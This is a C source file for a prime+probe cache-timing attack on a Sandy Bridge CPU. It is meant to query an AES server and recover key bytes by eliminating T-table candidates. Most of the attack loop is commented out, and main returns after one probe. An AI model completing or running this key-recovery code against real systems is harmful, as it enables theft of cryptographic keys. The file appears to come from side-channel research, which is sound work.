#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include "ctattack.h"

#include <math.h>

#define EMPIRICAL_CACHE_ACCESS_TIME 345
#define REPS 1
#define CIPHERTEXTS 1000000 //20000000

unsigned long int possible_key_space(int X[16][256]);

int main(int argc, char* argv[])
{

    char *ip_str;
    int server_port;
    int socket_desc;
    struct sockaddr_in server;
    unsigned char message[16], server_reply[16];
    FILE *fp;
    int i, j;
    int count = 0;
    int X[16][256], Y[16][256];


    //printf("sandybridge_i5_2435m_setup\n");

    volatile unsigned long int x = 0;
    size_t mem_length = (size_t)MB(2);
    volatile char *F = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    F[2048] = 0xAA;


    if (!sandybridge_i5_2435m_setup(F)) {       //0x56961540
        printf("[x] Not enough memory could be allocated on required cache-slice, please try again and/or increase hugepages available memory");
        return 0;
    }
    

    for (i = 0; i < 256; ++i) {
        for (j = 0; j < 16; ++j) {
            X[j][i] = 0;
            Y[j][i] = 0;
        }
    }


    if ((argc != 3) && (argc != 4)) {
        printf("[!]Usage: %s IP PORT [OUTFILE default: data.csv]\n", argv[0]);
        return 1;
    }
    ip_str = argv[1];
    server_port = atoi(argv[2]);
    server.sin_addr.s_addr = inet_addr(ip_str);
    server.sin_family = AF_INET;
    server.sin_port = htons( server_port );





    unsigned long int min_prob_time;
    unsigned long int prob_time;
    int c = 0;


    for (count = 0; count < CIPHERTEXTS; ++count) {

        //min_prob_time = 99999999;

        //for (i = 0; i < 16; ++i) {
        //    message[i] = (unsigned char)rand()%256;
        //}


        for (i = 0; i < REPS; ++i) {
            //socket_desc = socket(AF_INET, SOCK_STREAM, 0);
            //if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
            
            //Connect to remote server
            //if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");

            //printf("sandybridge_i5_2435m_prime\n");
            sandybridge_i5_2435m_prime(); //return 0;
            //printf("sandybridge_i5_2435m_reprime\n");
            sandybridge_i5_2435m_reprime();

            //if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
            //if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }

            //x += F[0];
            //printf("sandybridge_i5_2435m_probe\n");
            prob_time = sandybridge_i5_2435m_probe(); return 0;

            //if (prob_time < 360) 
            //    printf("prob_time\t:\t%d\n", prob_time);

            if (min_prob_time > prob_time) {
                min_prob_time = prob_time;
            }

            //close(socket_desc);

        }

        /*
        // if min probe time is less than a threshold increase counters for specific ciphertext
        for (i = 0; i < 16; ++i) {
            if (min_prob_time < EMPIRICAL_CACHE_ACCESS_TIME) {
                c++;
                X[i][(unsigned int)server_reply[i]] += 1;
            }
            Y[i][(unsigned int)server_reply[i]] += 1;
        }

        // Realtime calculation
        if (count % 10000 == 0) {
            //printf("Run %d\n\n", count / 10000);
            //possible_key_space(X);
        }
        */
        
    }

    //possible_key_space(X);






/*
// EXPORTING


    char dir[256];

    if (argc == 3) {
        sprintf(dir, "%s", "data.csv");
    } else {
        sprintf(dir, "%s", argv[3]);
    }
    

    fp = fopen((const char*)dir, "w");

    for (i = 0; i < REPS; ++i) {
        fprintf(fp, "%d\n", X[i]);
    }

    fclose(fp);

*/


    return 0;
}




unsigned long int possible_key_space(int X[16][256]) {
    int K[16][256];
    int TeN = 0;
    unsigned long int key_space = 1;
    int i, j, m, key_byte_count;

    for (i = 0; i < 16; ++i) {
        for (j = 0; j < 256; ++j) {
            K[i][j] = 0;
        }
    }

    for (m = 0; m < 16; ++m) {
        for (i = 0; i < 256; ++i) {
            if (X[m][i] < 1) {
                for (j = 0; j < 16; ++j) {
                    TeN = (get_TeN_idx(4, j/4) & (0xFF<<(j%4)*8) ) >> (j%4)*8;
                    K[m][i ^ TeN] += 1;
                }
            }
        }
    }
    
    for (j = 0; j < 16; ++j) {
        key_byte_count = 0;
        printf("Byte %d: ", j);
        for (i = 0; i < 256; ++i) {
            if (K[j][i] == 16) {
                key_byte_count++;
                printf("0x%02x\t", i);
            }
        }
        key_space *= key_byte_count;
        printf("\n");
    }

    printf("\nKey Space Reduced to:\t%lu\n\n", key_space);

    return key_space;

}




